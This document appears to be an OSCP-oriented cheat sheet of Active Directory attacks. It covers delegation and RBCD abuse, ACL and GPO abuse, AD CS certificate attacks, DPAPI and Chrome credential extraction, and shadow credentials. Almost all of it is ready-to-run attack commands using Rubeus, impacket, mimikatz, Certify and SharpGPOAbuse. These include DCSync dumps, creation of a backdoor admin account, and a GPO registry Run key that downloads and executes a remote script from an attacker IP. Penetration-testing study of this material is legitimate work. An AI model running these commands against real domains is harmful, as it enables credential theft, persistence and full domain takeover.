# Active Directory Advanced Attacks Guide

## Table of Contents
1. [AD Delegation Attacks](#ad-delegation-attacks)
2. [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
3. [ACL Abuse](#acl-abuse)
4. [GPO Abuse](#gpo-abuse)
5. [Certificate Attacks (AD CS)](#certificate-attacks-ad-cs)
6. [DPAPI Attacks](#dpapi-attacks)
7. [Shadow Credentials](#shadow-credentials)
8. [Machine Account Quota](#machine-account-quota)
9. [OSCP Scenarios](#oscp-scenarios)

---

## AD Delegation Attacks

### Unconstrained Delegation

#### Concept
Computer/user account trusted to delegate any service for any user.

#### Find Unconstrained Delegation
```powershell
# PowerView
Get-DomainComputer -Unconstrained

# ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"

# LDAP query
(userAccountControl:1.2.840.113556.1.4.803:=524288)
```

#### Exploit
```bash
# Monitor for TGTs when admin connects
# On compromised unconstrained delegation machine:

# Rubeus monitor
Rubeus.exe monitor /interval:1

# Force admin to connect (coerce authentication)
# PetitPotam, PrinterBug, etc.

# Extract TGT
Rubeus.exe dump /service:krbtgt

# Use TGT (Pass-the-Ticket)
Rubeus.exe ptt /ticket:base64ticket
```

### Constrained Delegation

#### Find Constrained Delegation
```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Check msDS-AllowedToDelegateTo attribute
```

#### Exploit with Protocol Transition (S4U2Self + S4U2Proxy)
```bash
# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# Impacket getST
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain.local/svc_account:password

# Use resulting ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.domain.local
```

---

## Resource-Based Constrained Delegation (RBCD)

### Concept
Instead of setting delegation on source, set it on target (msDS-AllowedToActOnBehalfOfOtherIdentity).

### Requirements
- Write permission on target computer object
- Ability to create computer accounts (MachineAccountQuota > 0)

### Attack Steps

#### 1. Check MachineAccountQuota
```powershell
# PowerView
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# ADSearch
ADSearch.exe --search "(objectClass=domain)" --attributes ms-DS-MachineAccountQuota
```

#### 2. Find Writable Computers
```powershell
# PowerView - Find computers we can write to
Find-InterestingDomainAcl | ?{$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl"}

# Check specific computer
Get-DomainComputer TARGET$ | Get-DomainObjectAcl | ?{$_.ActiveDirectoryRights -match "GenericWrite|GenericAll"}
```

#### 3. Create Fake Computer Account
```bash
# Impacket addcomputer
impacket-addcomputer domain.local/user:password -computer-name FAKECOMPUTER$ -computer-pass Password123

# PowerMad (PowerShell)
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

#### 4. Configure RBCD on Target
```powershell
# PowerView
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Impacket rbcd
impacket-rbcd -delegate-from 'FAKECOMPUTER$' -delegate-to 'TARGET$' -action 'write' domain.local/user:password
```

#### 5. Impersonate Admin
```bash
# Impacket getST
impacket-getST -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip 192.168.1.10 domain.local/FAKECOMPUTER$:Password123

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.domain.local
```

### RBCD One-Liner (Impacket)
```bash
# Full chain
impacket-addcomputer domain.local/user:password -computer-name EVIL$ -computer-pass EvilPass123
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action 'write' domain.local/user:password
impacket-getST -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/EVIL$:EvilPass123
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.domain.local
```

---

## ACL Abuse

### Common Abusable ACLs
- **GenericAll**: Full control
- **GenericWrite**: Update any attribute
- **WriteOwner**: Change owner
- **WriteDACL**: Modify permissions
- **AllExtendedRights**: All extended rights
- **ForceChangePassword**: Reset password
- **Self (Self-Membership)**: Add self to group

### Enumerate ACLs

#### PowerView
```powershell
# Find interesting ACLs
Find-InterestingDomainAcl | ?{$_.IdentityReferenceName -match "user"}

# Check specific object
Get-DomainObjectAcl -Identity "Domain Admins" | ?{$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL"}

# Resolve SIDs
Convert-SidToName S-1-5-21-...
```

### GenericAll Abuse

#### Reset Password
```powershell
# PowerView
Set-DomainUserPassword -Identity targetuser -Password $(ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Impacket
impacket-changepasswd domain.local/controlleduser:password -newpass 'NewPass123!' -targetuser targetuser
```

#### Targeted Kerberoasting
```powershell
# Set SPN on user
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/SPN'}

# Kerberoast
Rubeus.exe kerberoast /user:targetuser

# Remove SPN after
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

### WriteOwner Abuse

#### Take Ownership
```powershell
# PowerView
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity user

# Then grant yourself permissions
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity user -Rights All
```

### WriteDACL Abuse

#### Grant Permissions
```powershell
# Add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync

# Then DCSync
mimikatz # lsadump::dcsync /domain:domain.local /all

# Impacket
impacket-secretsdump domain.local/user:password@dc.domain.local
```

### Self (Self-Membership) Abuse

#### Add to Group
```powershell
# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members user

# net command
net group "Domain Admins" user /add /domain
```

### ForceChangePassword

#### Reset Password
```powershell
# PowerView
$Password = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $Password

# LDAP password change (Linux)
ldapmodify -x -D "CN=user,CN=Users,DC=domain,DC=local" -w password
dn: CN=targetuser,CN=Users,DC=domain,DC=local
changetype: modify
replace: unicodePwd
unicodePwd::$(echo -n '"NewPass123!"' | iconv -t UTF-16LE | base64)
```

---

## GPO Abuse

### Find Editable GPOs
```powershell
# PowerView
Get-DomainGPO | Get-DomainObjectAcl | ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"}

# Check specific GPO
Get-DomainGPO -Identity "Default Domain Policy" | Get-DomainObjectAcl | ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericAll"}
```

### Abuse with SharpGPOAbuse
```powershell
# Add local admin
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"

# Execute command
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Default Domain Policy"

# Force GPO update
gpupdate /force
```

### Manual GPO Abuse (Immediate Scheduled Task)
```powershell
# Create scheduled task via GPO
# GPO → Computer Configuration → Preferences → Control Panel Settings → Scheduled Tasks

# Or via PowerShell
New-GPO -Name "Backdoor" | New-GPLink -Target "OU=Computers,DC=domain,DC=local"
Set-GPPrefRegistryValue -Name "Backdoor" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')" -Type String
```

---

## Certificate Attacks (AD CS)

### ESC1 - Misconfigured Certificate Template

#### Find Vulnerable Templates
```powershell
# Certify
Certify.exe find /vulnerable

# Look for:
# - Client Authentication EKU
# - ENROLLEE_SUPPLIES_SUBJECT
# - Domain Users can enroll
```

#### Exploit
```powershell
# Request certificate as another user
Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Administrator

# Convert to PFX
certutil -f -p password cert.pem cert.pfx

# Authenticate with certificate
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt
```

### ESC8 - NTLM Relay to AD CS

#### Setup
```bash
# Start ntlmrelayx targeting AD CS
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication (PetitPotam, PrinterBug)
python3 PetitPotam.py -u user -p password attacker-ip target-dc-ip

# Receive certificate, convert and use
```

---

## DPAPI Attacks

### What is DPAPI?
Data Protection API - encrypts user credentials (browser passwords, RDP, etc.)

### Extract Master Keys

#### Find DPAPI Blobs
```powershell
# User DPAPI
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\

# System DPAPI
C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\
```

#### Decrypt with Mimikatz
```powershell
# Get user's DPAPI master key
sekurlsa::dpapi

# Decrypt credential
dpapi::cred /in:"C:\Users\user\AppData\Local\Microsoft\Credentials\CREDFILE"

# Decrypt using domain backup key (DA required)
lsadump::backupkeys /system:dc.domain.local /export

dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ff26f5a.pvk
```

### Extract Chrome Passwords
```powershell
# SharpChrome
SharpChrome.exe logins /unprotect

# Mimikatz
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```

---

## Shadow Credentials

### Concept
Add `msDS-KeyCredentialLink` to abuse Kerberos PKINIT.

### Requirements
- Write permission on target object (GenericAll, GenericWrite)

### Attack

#### Add Shadow Credential
```powershell
# Whisker
Whisker.exe add /target:targetuser

# PyWhisker (Linux)
python3 pywhisker.py -d domain.local -u user -p password --target targetuser --action add
```

#### Authenticate with Certificate
```powershell
# Rubeus (use output from Whisker)
Rubeus.exe asktgt /user:targetuser /certificate:CERT /password:PASSWORD /nowrap

# Linux
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass password domain.local/targetuser targetuser.ccache
export KRB5CCNAME=targetuser.ccache
```

---

## Machine Account Quota

### Check Quota
```powershell
# PowerView
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# Default: 10
```

### Abuse
```bash
# If quota > 0, create computer accounts for RBCD, etc.
impacket-addcomputer domain.local/user:password -computer-name COMPUTER$ -computer-pass Pass123
```

---

## OSCP Scenarios

### Scenario 1: RBCD to Domain Admin
```bash
# 1. Check MachineAccountQuota
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# 2. Find writable computer
Find-InterestingDomainAcl | ?{$_.ActiveDirectoryRights -match "GenericWrite"}

# 3. Create fake computer
impacket-addcomputer domain.local/user:pass -computer-name FAKE$ -computer-pass FakePass123

# 4. Configure RBCD
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'DC01$' -action 'write' domain.local/user:pass

# 5. Impersonate DA
impacket-getST -spn cifs/DC01.domain.local -impersonate Administrator domain.local/FAKE$:FakePass123

# 6. DCSync
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass DC01.domain.local
```

### Scenario 2: ACL Abuse to DCSync
```bash
# 1. Find WriteDACL on domain
Find-InterestingDomainAcl | ?{$_.ActiveDirectoryRights -match "WriteDACL"}

# 2. Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync

# 3. DCSync
impacket-secretsdump domain.local/user:pass@dc.domain.local
```

### Scenario 3: GPO Abuse
```bash
# 1. Find editable GPO
Get-DomainGPO | Get-DomainObjectAcl | ?{$_.ActiveDirectoryRights -match "WriteProperty"}

# 2. Add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "GPO NAME"

# 3. Force update
gpupdate /force

# 4. Access as local admin
evil-winrm -i target -u user -p pass
```

---

## Tools Reference

```powershell
# PowerView
Import-Module PowerView.ps1

# Rubeus
Rubeus.exe

# Certify
Certify.exe find /vulnerable

# Whisker
Whisker.exe add /target:user

# SharpGPOAbuse
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "GPO"
```

```bash
# Impacket
impacket-rbcd
impacket-getST
impacket-addcomputer
impacket-secretsdump

# PyWhisker
python3 pywhisker.py
```

---

**Remember**: Advanced AD attacks are complex but very powerful. RBCD and ACL abuse are increasingly common in OSCP!
